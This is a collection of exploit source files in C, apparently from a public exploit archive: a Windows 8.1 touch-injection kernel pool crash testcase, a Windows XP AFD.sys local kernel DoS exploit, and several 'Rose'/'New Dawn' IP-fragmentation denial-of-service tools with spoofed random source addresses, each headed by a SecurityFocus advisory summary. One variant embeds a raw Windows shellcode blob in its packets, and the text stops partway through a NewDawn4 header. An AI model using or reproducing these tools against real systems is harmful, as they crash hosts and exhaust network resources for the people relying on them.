#pragma comment(lib, "gdi32")
#pragma comment(lib, "advapi32")
 
// InitializeTouchInjection() Win8.1 Testcase
// -- Tavis Ormandy <taviso@google.com>, Feb 2014.
 
int main(int argc, char **argv)
{
POINTER_TOUCH_INFO Contact;
SID_AND_ATTRIBUTES SidToRestricted;
ULONG Size;
HANDLE Handle;
 
ZeroMemory(&Contact, sizeof Contact);
ZeroMemory(&SidToRestricted, sizeof SidToRestricted);
 
// I *think* TOUCH_MASK_CONTACTAREA is required (i.e. rcContact), the rest
// just need to be valid.
Contact.pointerInfo.pointerType = PT_TOUCH;
Contact.pointerInfo.pointerFlags = POINTER_FLAG_DOWN | POINTER_FLAG_INRANGE | POINTER_FLAG_INCONTACT;
Contact.pointerInfo.ptPixelLocation.x = 'AAAA';
Contact.pointerInfo.ptPixelLocation.y = 'AAAA';
Contact.rcContact.left = 'AAAA';
Contact.rcContact.right = 'AAAA';
Contact.rcContact.top = 'AAAA';
Contact.rcContact.bottom = 'AAAA';
Contact.touchFlags = TOUCH_FLAG_NONE;
Contact.touchMask = TOUCH_MASK_CONTACTAREA;
Size = SECURITY_MAX_SID_SIZE;
Handle = INVALID_HANDLE_VALUE;
SidToRestricted.Sid = _alloca(Size);
 
CreateWellKnownSid(WinNullSid, NULL, SidToRestricted.Sid, &Size);
 
// This just exhausts available pool (how that's accomplished is irrelevant).
for (Size = 1 << 26; Size; Size >>= 1) {
while (CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
;
}
 
for (;;) {
// Initialize touch injection with very small number of contacts.
InitializeTouchInjection(1, TOUCH_FEEDBACK_DEFAULT);
 
// Now increase the number of contacts, which should (eventually) cause an allocation fail.
InitializeTouchInjection(MAX_TOUCH_COUNT, TOUCH_FEEDBACK_DEFAULT);
 
// I think this will just massage the pool, sequence found by fuzzing.
OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &Handle);
CreateRestrictedToken(Handle, 0, 0, NULL, 0, NULL, 1, &SidToRestricted, &Handle);
 
// Write something to the touch injection allocation.
InjectTouchInput(1, &Contact);
}
 
return 0;
}
////////////////////////////////////////////////////////////////////////////
//
// Title: Microsoft Windows xp AFD.sys Local Kernel DoS Exploit
// Author: Lufeng Li of Neusoft Corporation
// Vendor: www.microsoft.com
// Vulnerable: Windows xp sp3
//
/////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <Winsock2.h>

#pragma comment (lib, "ws2_32.lib")

BYTE buf[]={
0xac,0xfd,0xd3,0x00,0x01,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x20,0x00,0x00,0x00,0xe8,0xfd,0xd3,0x00,
0xb8,0xfd,0xd3,0x00,0xf8,0xfd,0xd3,0x00,0xc4,0xfd,
0xd3,0x00,0xcc,0xfd,0xd3,0x00};

int main( )
{
    WSADATA ws;

    SOCKET tcp_socket;
    struct sockaddr_in peer;
	ULONG  dwReturnSize;

	printf("\n Microsoft Windows xp AFD.sys Local Kernel DoS Exploit \n\n");
	printf("\t Create by Lufeng Li of Neusoft Corporation. \n\n");

    WSAStartup(0x0202,&ws);

    peer.sin_family = AF_INET;
    peer.sin_port = htons( 0x01bd );
    peer.sin_addr.s_addr = inet_addr( "127.0.0.1" );

    tcp_socket = socket(AF_INET, SOCK_DGRAM, 0);//SOCK_DGRAM

	if ( connect(tcp_socket, (struct sockaddr*) &peer, sizeof(struct sockaddr_in)) )
    {
		printf("connect error\n");
        exit(0);
    }

	DeviceIoControl( (HANDLE)tcp_socket,0x000120cf, buf,0x24,buf,0x24,&dwReturnSize, NULL);
	
    return TRUE;
}source: http://www.securityfocus.com/bid/11258/info

Multiple vendor implementations of the TCP stack are reported prone to a remote denial-of-service vulnerability. 

The issue is reported to present itself due to inefficiencies present when handling fragmented TCP packets. 

The discoverer of this issue has dubbed the attack style the "New Dawn attack"; it is a variation of a previously reported attack that was named the "Rose Attack". 

A remote attacker may exploit this vulnerability to deny service to an affected computer. 

Microsoft Windows 2000/XP, Linux kernel 2.4 tree, and undisclosed Cisco systems are reported prone to this vulnerability; other products may also be affected.


/***
    ROSE attack (variation 2) (chuck (at) lemure.net)
    
    Discovered by:
    gandalf (at) digital.net
    
    code modified from large IGMP attack by:
        Kox by Coolio (coolio (at) k-r4d.com)

    Sends out small IP fragments totalling up to a large
    ICMP packet.  Then repeatedly sends last IP Fragment forcing
    reassembly code to traverse to last IP fragment in order to
    do a free() followed by a malloc().  Or so it seems.

    Reportedly works for TCP / UDP as well, since this is
    a IP layer attack.


***/

/* just a thousand kills win XP */

#define NUM_PACKETS 100


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <pwd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include <netinet/ip_icmp.h>

void usage(char *arg)
{
        printf("Rose attack\n");
        printf("Usage: %s <victim> [source]\n", arg);
	printf("If source not specified, will send out from random ip's\n");
        exit(1);
}


unsigned int randip()
{
        struct hostent *he;
        struct sockaddr_in sin;
        char *buf = (char *)calloc(1, sizeof(char) * 16);
	
        sprintf(buf, "%d.%d.%d.%d",
                (random()%191)+23,
                (random()%253)+1,
                (random()%253)+1,
                (random()%253)+1); 
	
        return inet_addr(buf);
        
}

unsigned short in_cksum(unsigned short *buh, int len)
{
        register long sum = 0;
        unsigned short oddbyte;
        register unsigned short answer;

        while(len > 1) {
                sum += *buh++;
                len -= 2;
        }

        if(len == 1) {
                oddbyte = 0;
                *((unsigned char *)&oddbyte) = *(unsigned char *)buh;
                sum += oddbyte;
        }

        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        answer = ~sum;
        return answer;
}

int fire_away(struct sockaddr_in *victim, unsigned long src)
{
        int SMALLICMP = 1;
        unsigned char *pkt;
        struct iphdr *ip;
        struct igmphdr *igmp;
	struct icmphdr *icmp_pkt;
        struct utsname *un;
        struct passwd *p;
	int idList[NUM_PACKETS];
	unsigned long j;
        int i, s;
	int id = (random() % 40000) + 500;
	for (i=0;i<NUM_PACKETS;i++)
	  idList[i]=(random() % 40000) + 500;

        

        pkt = (unsigned char *)calloc(1, SMALLICMP 
				      + sizeof(struct iphdr) +
				      sizeof(struct icmphdr));
        ip = (struct iphdr *)pkt;
 	icmp_pkt = (struct icmphdr *)(pkt + sizeof(struct iphdr));
        ip->version = 4;
        ip->ihl = (sizeof *ip) / 4;
        ip->ttl = 255;
        ip->tot_len = htons(SMALLICMP);
        ip->protocol = 1;
        ip->id = htons(id);
        ip->frag_off = htons(IP_MF);
        ip->saddr = src;
        ip->daddr = victim->sin_addr.s_addr;
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

	
	icmp_pkt->type = ICMP_ECHO;
	icmp_pkt->code = 0;
	icmp_pkt->checksum = 1000;
	icmp_pkt->un.echo.id = random() % 255;
	icmp_pkt->un.echo.sequence = random() % 255;
	
        for(i = sizeof(struct iphdr) + sizeof(struct icmphdr) + 1;
            i < SMALLICMP; i++){
	  pkt[i] = random() % 255;
	  
	}
	
        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("error: socket()");
                return 1;
        }
	
	printf(" Sending out series of small fragments\r\n");
	
	for(i=0;i<NUM_PACKETS;i++){
	  ip->id = htons(idList[i]);
	  for (j=0; j<8170; j += SMALLICMP + 1){	    
	    ip->frag_off = htons(j | IP_MF);
	    if(sendto(s, pkt,
		      SMALLICMP + sizeof(struct iphdr), 
		      0, (struct sockaddr *)victim,
		      sizeof(struct sockaddr_in)) == -1) { 
	      perror("error: sendto()");
	      return 1;
	    }
	  }
	}

	printf(" Sending out tailing fragments\r\n");
	/* big frag at end... */
	/* sending a large amount of the end fragments over and
	   over.  This is definitely overkill, but seems to work */
	for (j=0;j<9999*NUM_PACKETS;j++){
	  for(i=0;i<NUM_PACKETS;i++){
	    ip->id=htons(idList[i]);
	    ip->frag_off = htons(8190|IP_MF);
	    //ip->frag_off = htons(8100 | IP_MF);
	    sendto(s, pkt, sizeof(struct iphdr) + SMALLICMP, 
		   0, (struct sockaddr *)victim, 
		   sizeof(struct sockaddr_in));
	    /* if you do sleep, CPU usage goes way down.  But memory usage
	       still creeps upward */
	    //usleep(100); //sleep after every trailing packet
	  }
	  usleep(100); //sleep after every series of NUM_PACKETS
	}
        free(pkt);
        close(s);
        return 0;
}

int main(int argc, char *argv[])
{
        struct sockaddr_in victim;
        struct hostent *he;
	unsigned long source;
        int i;

        srandom(time(NULL));

        if(argc < 2)
                usage(argv[0]);

        if((he = gethostbyname(argv[1])) == NULL) {
                herror(argv[1]);
                exit(1);
        }
	
	if (argc > 2){
	  source = inet_addr(argv[2]);
	}
	else {
	  source = randip();
	}
	
        memcpy(&victim.sin_addr.s_addr, he->h_addr, he->h_length);
        victim.sin_port = htons(0);
        victim.sin_family = PF_INET;

        printf("Sending ICMP fragments:  \r\n");
        fflush(stdout);
	fire_away(&victim, source);
	if (argc < 3){
	  source = randip();
	}
	
	fflush(stdout);
	printf("\nDONE\n");
        fflush(stdout);
}
source: http://www.securityfocus.com/bid/11258/info
 
Multiple vendor implementations of the TCP stack are reported prone to a remote denial-of-service vulnerability.
 
The issue is reported to present itself due to inefficiencies present when handling fragmented TCP packets.
 
The discoverer of this issue has dubbed the attack style the "New Dawn attack"; it is a variation of a previously reported attack that was named the "Rose Attack".
 
A remote attacker may exploit this vulnerability to deny service to an affected computer.
 
Microsoft Windows 2000/XP, Linux kernel 2.4 tree, and undisclosed Cisco systems are reported prone to this vulnerability; other products may also be affected.

/***
    ROSE attack (chuck (at) lemure.net)

    Discovered by:
    gandalf@digital.net
    
    code modified from large IGMP attack by:
    Kox by Coolio (coolio@k-r4d.com)


    Sends out first and last ICMP packet echo request.
    Reportedly works for TCP / UDP as well, since this is
    a IP layer attack.

    Eats up all available packets for fragmentation reassembly.


***/

/* just a thousand kills win XP */

#define NUM_PACKETS 1000


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <pwd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include <netinet/ip_icmp.h>

/* Figured I try sending some shell code for my random payload...
   doesn't do anything
*/

char code[] =
"\xe8\x38\x00\x00\x00\x43\x4d\x44\x00\xe7\x79\xc6\x79\xe5\x49\x86"
"\x49\xa4\xad\x2e\xe9\xa4\x1a\x70\xc7\xd9\x09\xf5\xad\xcb\xed\xfc"
"\x3b\x8e\x4e\x0e\xec\x7e\xd8\xe2\x73\xad\xd9\x05\xce\x72\xfe\xb3"
"\x16\x57\x53\x32\x5f\x33\x32\x2e\x44\x4c\x4c\x00\x01\x5b\x54\x89"
"\xe5\x89\x5d\x00\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c"
"\xad\x8b\x58\x08\xeb\x0c\x8d\x57\x2c\x51\x52\xff\xd0\x89\xc3\x59"
"\xeb\x10\x6a\x08\x5e\x01\xee\x6a\x0a\x59\x8b\x7d\x00\x80\xf9\x06"
"\x74\xe4\x51\x53\xff\x34\x8f\xe8\x90\x00\x00\x00\x59\x89\x04\x8e"
"\xe2\xeb\x31\xff\x66\x81\xec\x90\x01\x54\x68\x01\x01\x00\x00\xff"
"\x55\x20\x57\x57\x57\x57\x47\x57\x47\x57\xff\x55\x1c\x89\xc3\x31"
"\xff\x57\x57\x68\x02\x00\x22\x11\x89\xe6\x6a\x10\x56\x53\xff\x55"
"\x18\x57\x53\xff\x55\x14\x57\x56\x53\xff\x55\x10\x89\xc2\x66\x81"
"\xec\x54\x00\x8d\x3c\x24\x31\xc0\x6a\x15\x59\xf3\xab\x89\xd7\xc6"
"\x44\x24\x10\x44\xfe\x44\x24\x3d\x89\x7c\x24\x48\x89\x7c\x24\x4c"
"\x89\x7c\x24\x50\x8d\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49"
"\x51\x51\xff\x75\x00\x51\xff\x55\x30\x89\xe1\x68\xff\xff\xff\xff"
"\xff\x31\xff\x55\x2c\x57\xff\x55\x0c\xff\x55\x28\x53\x55\x56\x57"
"\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18"
"\x8b\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc"
"\x31\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c"
"\x24\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c"
"\x01\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d"
"\x5b\xc2\x08\x00";

void usage(char *arg)
{
        printf("Rose attack\n");
        printf("Usage: %s <victim> [source]\n", arg);
	printf("If source not specified, will send out from random ip's\n");
        exit(1);
}


unsigned int randip()
{
        struct hostent *he;
        struct sockaddr_in sin;
        char *buf = (char *)calloc(1, sizeof(char) * 16);
	
        sprintf(buf, "%d.%d.%d.%d",
                (random()%191)+23,
                (random()%253)+1,
                (random()%253)+1,
                (random()%253)+1); 
	
	
	
        return inet_addr(buf);
        
}

unsigned short in_cksum(unsigned short *buh, int len)
{
        register long sum = 0;
        unsigned short oddbyte;
        register unsigned short answer;

        while(len > 1) {
                sum += *buh++;
                len -= 2;
        }

        if(len == 1) {
                oddbyte = 0;
                *((unsigned char *)&oddbyte) = *(unsigned char *)buh;
                sum += oddbyte;
        }

        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        answer = ~sum;
        return answer;
}

int rose(struct sockaddr_in *victim, unsigned long src)
{
        int SMALLICMP = 1000;
        unsigned char *pkt;
        struct iphdr *ip;
        struct igmphdr *igmp;
	struct icmphdr *icmp_pkt;
        struct utsname *un;
        struct passwd *p;

        int i, s,j;
        int id = (random() % 40000) + 500;

        pkt = (unsigned char *)calloc(1, SMALLICMP);
        ip = (struct iphdr *)pkt;
 	icmp_pkt = (struct icmphdr *)(pkt + sizeof(struct iphdr));
        ip->version = 4;
        ip->ihl = (sizeof *ip) / 4;
        ip->ttl = 255;
        ip->tot_len = htons(SMALLICMP);
        ip->protocol = 1;
        ip->id = htons(id);
        ip->frag_off = htons(IP_MF);
        ip->saddr = src;
        ip->daddr = victim->sin_addr.s_addr;
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

	icmp_pkt->type = ICMP_ECHO;
	icmp_pkt->code = 0;
	icmp_pkt->checksum = 1000;
	icmp_pkt->un.echo.id = random() % 255;
	icmp_pkt->un.echo.sequence = random() % 255;
	
        for(i = sizeof(struct iphdr) + sizeof(struct icmphdr) + 1;
            i < SMALLICMP; i++){
	  //pkt[i] = random() % 255;
	  pkt[i] = '\x00';
	}
	j=0;
	for (i=sizeof(struct iphdr) + sizeof(struct icmphdr) + 500;
	     i < sizeof(struct iphdr) + sizeof(struct icmphdr) + 500 + 356; 
	     i++){
	  pkt[i] = code[j];
	  j++;
	}
        if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("error: socket()");
                return 1;
        }

        if(sendto(s, pkt, SMALLICMP, 0, (struct sockaddr *)victim,
           sizeof(struct sockaddr_in)) == -1) { 
                perror("error: sendto()");
                return 1;
        }

	/* big frag at end... */

	ip->frag_off = htons(8100);
	//ip->frag_off = htons(8100 | IP_MF);
	sendto(s, pkt, SMALLICMP, 0, (struct sockaddr *)victim, 
	       sizeof(struct sockaddr_in));
	
        free(pkt);
        close(s);
	usleep(1000);
        return 0;
}

int main(int argc, char *argv[])
{
        struct sockaddr_in victim;
        struct hostent *he;
	unsigned long source;
        int i;

        srandom(time(NULL));

        if(argc < 2)
                usage(argv[0]);

        if((he = gethostbyname(argv[1])) == NULL) {
                herror(argv[1]);
                exit(1);
        }
	
	if (argc > 2){
	  source = inet_addr(argv[2]);
	}
	else {
	  source = randip();
	}
	
        memcpy(&victim.sin_addr.s_addr, he->h_addr, he->h_length);
        victim.sin_port = htons(0);
        victim.sin_family = PF_INET;

        printf("Sending ICMP fragments:  ");
        fflush(stdout);
        for(i = 0; i < NUM_PACKETS; i++)
	  {
                rose(&victim, source);
		if (argc < 3){
		  source = randip();
		}
                printf("%d\n", i);
                fflush(stdout);
	  }
        printf("\nDONE\n");
        fflush(stdout);
}


source: http://www.securityfocus.com/bid/11258/info
  
Multiple vendor implementations of the TCP stack are reported prone to a remote denial-of-service vulnerability.
  
The issue is reported to present itself due to inefficiencies present when handling fragmented TCP packets.
  
The discoverer of this issue has dubbed the attack style the "New Dawn attack"; it is a variation of a previously reported attack that was named the "Rose Attack".
  
A remote attacker may exploit this vulnerability to deny service to an affected computer.
  
Microsoft Windows 2000/XP, Linux kernel 2.4 tree, and undisclosed Cisco systems are reported prone to this vulnerability; other products may also be affected.


/*-------------------------------------------------------------*/
/*
  Implementation of Rose Attack described by Gandalf gandalf at digital.net
  Reference: Bugtraq, 30 mars 2004, "IPv4 fragmentation, The Rose Attack"

  NewDawn3.c written by Ken Hollis based on the code rose.c
  written by Laurent Constantin and rose2.c written by chuck
  modified from large IGMP attack by Kox by Coolio (coolio (at) k-r4d.com)

  Program allows choice of TCP or UDP, number of packets to fragment, number
  of fragments per packet and number of times the last fragment is
  rewritten.

  Based on a conversation where it was mentioned that a highly fragmented
  packet would cause high CPU utilization if the last fragment was written
  over and over again.  As chuck says, death by a thousand cuts.
  
  NewDawn3 send 32 byte fragments.  See:
  http://digital.net/~gandalf/Rose_Frag_Attack_Explained.htm
  
 Usage : ./NewDawn3 type(1or2) ipaddress [port] [NumP] [Numt] [NumR] [NumF] [NumD]
 Example: ./NewDawn3 1 1.2.3.4 80 5 9999 99999999 4080 2
   type      : 1=tcp, 2=udp
   ipaddress : address to test
   port      : optional port number (0 means random)
   NumP      : Number of packets to fragment (less than 1000)
   NumT      : Number of times last fragment is rewritten
   NumR      : Number of times to run test
   NumF      : Number of fragments per packet
   NumD      : Delta between fragements.  8 = 32 bytes blank
               64 bytes total between fragments (32 bytes 
	       payload + 32 bytes blank = 64 bytes),
               5 = 8 bytes blank (32 bytes payload + 8 bytes
	       blank = 40 bytes total = 5 * 8).
	       < 5 = overlapping fragments


  Library netwib must be installed:
    http://www.laurentconstantin.com/en/netw/netwib/
    http://go.to/laurentconstantin

  To compile and run :
    gcc -Wall -o NewDawn3 NewDawn3.c `netwib-config -lc`
    ./NewDawn3 1 www.example.com 80

    The command:
    ./NewDawn3 1 10.12.14.16
    Is equivalent to:
    ./NewDawn3 1 10.12.14.16 0 5 9999 99999999 1021 8
    Where:
    ./NewDawn3 = Program Name
    1 = TCP
    10.12.14.16 = IP Address
    0 = Random port numbers
    5 = Five packets to fragment before staring next set of packets
    9999 = The number of times to rewrite the last fragment of
           the five packets
    99999999 = The number of times to run this entire attack
    1021 = The number of middle fragments to write.
    8 = 64 bytes between 32 byte fragments (8 bytes * 8 = 64)

  This was successfully tested with netwib 5.12.0, under Linux
  to test a Windows 2000 host. Local network is Ethernet.
*/

/*-------------------------------------------------------------*/
// Test large number of packets
#define NUM_PACKETS 1000
#define NUM_LAST 9999
#define NUM_RUN 99999999
#define NUM_FRAG 8170
#define NUM_DELTA 8

#include <stdlib.h>
#include <stdio.h>
#include <netwib.h>

/*-------------------------------------------------------------*/
typedef enum {
  ROSE_TYPE_TCP = 1,
  ROSE_TYPE_UDP = 2
} rose_type;

/*-------------------------------------------------------------*/
typedef struct {
  rose_type type;
  netwib_ip ipad;
  netwib_port port;
  netwib_bool display;
  netwib_buf buf;
  netwib_io *pio;
} rose_params;

/*-------------------------------------------------------------*/
static netwib_err rose_loop(rose_params *prp, int npack, int nrew, 
		int nrun, int nfrag, int ndelta)
{
  netwib_iphdr ipheader, ipstore[NUM_PACKETS];
  netwib_tcphdr tcpheader, tcpstore[NUM_PACKETS];
  netwib_udphdr udpheader, udpstore[NUM_PACKETS];
  netwib_buf payload;
  netwib_uint32 numsent = 0;
  int i, j, nrun2;

printf("Packets %d Rewrite %d Runs %d Fragment packet to byte %d Delta %d\n\r",
           npack, nrew, nrun, nfrag, ndelta);
  
  for (nrun2=0; nrun2<nrun; nrun2++) {

    for (i=0; i<npack; i++){
	netwib_er(netwib_iphdr_initdefault(NETWIB_IPTYPE_IP4, &ipstore[i]));
	netwib_er(netwib_uint32_init_rand_all(&ipstore[i].src.ipvalue.ip4));
	switch(prp->type) {
	case ROSE_TYPE_TCP :
        netwib_er(netwib_tcphdr_initdefault(&tcpstore[i]));
        netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpstore[i].src));
        if (prp->port == 0) {
          netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpstore[i].dst));
	} else {
	  tcpstore[i].dst = prp->port;
    	}
        break;
	case ROSE_TYPE_UDP :
	netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpstore[i].src));
	if (prp->port == 0) {
	  netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpstore[i].dst));
        } else {
          udpstore[i].dst = prp->port;
        }
	break;
       }
    }
    
    for (i=0; i<npack; i++){
    /* construct first fragment */
    netwib__buf_reinit(&prp->buf);
    ipheader = ipstore[i];
    ipheader.header.ip4.morefrag = NETWIB_TRUE;
    ipheader.header.ip4.offsetfrag = 0; /* not necessary, but to be clear */
    ipheader.src.iptype = NETWIB_IPTYPE_IP4;
    ipheader.src.ipvalue.ip4 = ipstore[i].src.ipvalue.ip4;
    ipheader.dst = prp->ipad;
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      tcpheader = tcpstore[i];
      tcpheader.src = tcpstore[i].src;
      tcpheader.dst = tcpstore[i].dst;
      tcpheader.ack = NETWIB_TRUE;
      netwib_er(netwib_buf_init_ext_text("1234567890123456789012345678",
                                         &payload));
      netwib_er(netwib_pkt_append_iptcpdata(&ipheader, &tcpheader, &payload,
                                          &prp->buf));
      break;
    case ROSE_TYPE_UDP :
      netwib_er(netwib_udphdr_initdefault(&udpheader));
      udpheader.src = udpstore[i].src;
      udpheader.dst = udpstore[i].dst;
      netwib_er(netwib_buf_init_ext_text("12345678901234567890123456789012",
                                         &payload));
      netwib_er(netwib_pkt_append_ipudpdata(&ipheader, &udpheader, &payload,
                                            &prp->buf));
      break;
    }
    if (prp->display) {
      netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
                                      NETWIB_ENCODETYPE_DUMP));
    }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));
    
    /* construct middle fragments */
    netwib__buf_reinit(&prp->buf);
    ipheader.header.ip4.offsetfrag = 0x0008;
    for(ipheader.header.ip4.offsetfrag = 0x0008 ; 
	ipheader.header.ip4.offsetfrag< nfrag; 
	ipheader.header.ip4.offsetfrag = ipheader.header.ip4.offsetfrag + 
	                                 ndelta){
    netwib__buf_reinit(&prp->buf);
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      ipheader.protocol = NETWIB_IPPROTO_TCP;
      break;
    case ROSE_TYPE_UDP :
      ipheader.protocol = NETWIB_IPPROTO_UDP;
      break;
    }
    netwib_er(netwib_buf_init_ext_text("12345678901234567890123456789012",
			    &payload));
    netwib_er(netwib_pkt_append_ipdata(&ipheader, &payload, &prp->buf));
    if (prp->display) {
    netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
				    NETWIB_ENCODETYPE_DUMP));
    }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));
    }

    }

    printf("Rewriting %d packets last fragment %d times\r\n",
		    npack,nrew); fflush(stdout);

    /* construct last fragment and rewrite NUM_LAST times */
    for (j=0;j<nrew;j++){
    netwib__buf_reinit(&prp->buf);
    for (i=0; i<npack; i++){
    ipheader = ipstore[i];
    ipheader.src.iptype = NETWIB_IPTYPE_IP4;
    ipheader.src.ipvalue.ip4 = ipstore[i].src.ipvalue.ip4;
    ipheader.dst = prp->ipad;
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      tcpheader = tcpstore[i];
      tcpheader.src = tcpstore[i].src;
      tcpheader.dst = tcpstore[i].dst;
      tcpheader.ack = NETWIB_TRUE;
      ipheader.protocol = NETWIB_IPPROTO_TCP;
    break;
    case ROSE_TYPE_UDP :
      udpheader.src = udpstore[i].src;
      udpheader.dst = udpstore[i].dst;
      ipheader.protocol = NETWIB_IPPROTO_UDP;
    break;
    }
    
    netwib__buf_reinit(&prp->buf);
    ipheader.header.ip4.morefrag = NETWIB_FALSE;
    ipheader.header.ip4.offsetfrag = 0x1FF0;
    netwib_er(netwib_buf_init_ext_text("12345678901234567890123456789012",
                                       &payload));
    netwib_er(netwib_pkt_append_ipdata(&ipheader, &payload, &prp->buf));
    if (prp->display) {
      netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
                                      NETWIB_ENCODETYPE_DUMP));
       }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));
    }
    }
    /* dot display */
    if (!prp->display && (numsent%100)==0) {
      printf("."); fflush(stdout);
    }
    numsent++;
  }

  return(NETWIB_ERR_OK);
}

/*-------------------------------------------------------------*/
int main(int argc, char* argv[])
{
  rose_params rp;
  netwib_buf ipstr;
  netwib_err ret;
  int npack, nrew, nrun, nfrag, ndelta;

  /* initialize netwib */
  netwib_init();

  /* check parameter count */
  if (argc < 3 || argc > 9) {
    printf("Usage  : %s type(1or2) ipaddress [port] [NumP] [Numt] [NumR] [NumF] [NumD]\n", argv[0]);
    printf("Example: %s 1 1.2.3.4 80 5 9999 99999999 1021 8\n", argv[0]);
    printf(" type      : %d=tcp, %d=udp\n", ROSE_TYPE_TCP, ROSE_TYPE_UDP);
    printf(" ipaddress : address to test\n");
    printf(" port      : optional port number (0 means random)\n");
    printf(" NumP      : Number of packets to fragment\n");
    printf(" NumT      : Number of times last fragment is rewritten\n");
    printf(" NumR      : Number of times to run test\n");
    printf(" NumF      : Number of fragments per packet\n");
    printf(" NumD      : Delta between fragements.\n");
   return(1);
  }

  /* first parameter is type */
  rp.type = atoi(argv[1]);
  switch(rp.type) {
  case ROSE_TYPE_TCP :
  case ROSE_TYPE_UDP :
    break;
  default :
    printf("First parameter must be 1 or 2 (currently=%s)\n", argv[1]);
    return(2);
  }

  /* second parameter is IP address */
  netwib_er(netwib_buf_init_ext_text(argv[2], &ipstr));
  ret = netwib_ip_init_buf(&ipstr, NETWIB_IP_DECODETYPE_BEST, &rp.ipad);
  if (ret != NETWIB_ERR_OK) {
    printf("Second parameter must be an IP or hostname (currently=%s)\n",
           argv[2]);
    return(3);
  }

  /* third parameter is port number */
  rp.port = 0;
  if (argc > 3) {
    rp.port = atoi(argv[3]); /* on error, set to 0, but that's ok */
  }

  /* fourth parameter is number of packets to fragment */
  npack = 5;
  if (argc > 4) {
    npack = atoi(argv[4]); /* on error, set to 1 */
    }
  if (npack < 1) { npack = 1; }
  if (npack > 1000) { npack = 1000; }
  
  /* fifth parameter is number of times packet is rewritten */
  nrew = NUM_LAST;
  if (argc > 5) {
    nrew = atoi(argv[5]); /* on error, set to 0, but that's ok */
    }
  
  /* sixth parameter is number of times to run the test */
  nrun = NUM_RUN;
  if (argc > 6) {
    nrun = atoi(argv[6]); /* on error, set to 0, but that's ok */
    }
  
  /* seventh parameter is number of fragments per packet */
  nfrag = NUM_FRAG;
  if (argc > 7) {
    nfrag = atoi(argv[7]); 
    }
  if (nfrag < 1) { nfrag = 1; }

  /* eighth parameter is delta between fragments */
    ndelta = NUM_DELTA;
    if (argc > 8) {
      ndelta = atoi(argv[8]);
      }

  /* Make sure that the fragments do not exceed 8170 */

    nfrag = (nfrag * ndelta) + 8;
    if (nfrag > 8170) { nfrag = 8170; }
  
  printf("%s %d %s %d %d %d %d %d ndelta = %d\n\r",
          argv[0], rp.type, argv[2], rp.port, npack, nrew, nrun, 
	  nfrag / 8, ndelta);

  /* set to NETWIB_TRUE to activate display */
  rp.display = NETWIB_FALSE;

  /* instead of allocating memory each time, just use this permanent buffer */
  netwib_er(netwib_buf_init_mallocdefault(&rp.buf));

  /* initialize spoofing feature */
  netwib_er(netwib_io_init_spoof_ip(NETWIB_SPOOF_IP_INITTYPE_LINKBRAW,
                                    &rp.pio));

  /* main function */
  ret = rose_loop(&rp, npack, nrew, nrun, nfrag, ndelta);
  if (ret != NETWIB_ERR_OK) {
    netwib_er(netwib_err_display(ret, NETWIB_ERR_ENCODETYPE_FULL));
    return(ret);
  }

  /* close netwib */
  netwib_er(netwib_io_close(&rp.pio));
  netwib_er(netwib_buf_close(&rp.buf));
  netwib_close();

  return(0);
}

source: http://www.securityfocus.com/bid/11258/info
   
Multiple vendor implementations of the TCP stack are reported prone to a remote denial-of-service vulnerability.
   
The issue is reported to present itself due to inefficiencies present when handling fragmented TCP packets.
   
The discoverer of this issue has dubbed the attack style the "New Dawn attack"; it is a variation of a previously reported attack that was named the "Rose Attack".
   
A remote attacker may exploit this vulnerability to deny service to an affected computer.
   
Microsoft Windows 2000/XP, Linux kernel 2.4 tree, and undisclosed Cisco systems are reported prone to this vulnerability; other products may also be affected.

/*-------------------------------------------------------------*/
/*
  Implementation of Rose Attack described by Gandalf gandalf at digital.net
  Reference: Bugtraq, 30 mars 2004, "IPv4 fragmentation, The Rose Attack"

  NewDawn4.c written by Ken Hollis based on the code rose.c
  written by Laurent Constantin and NewDawn.c and NewDawn2.c 
  written by chuck modified from large IGMP attack by Kox by 
  Coolio (coolio (at) k-r4d.com)

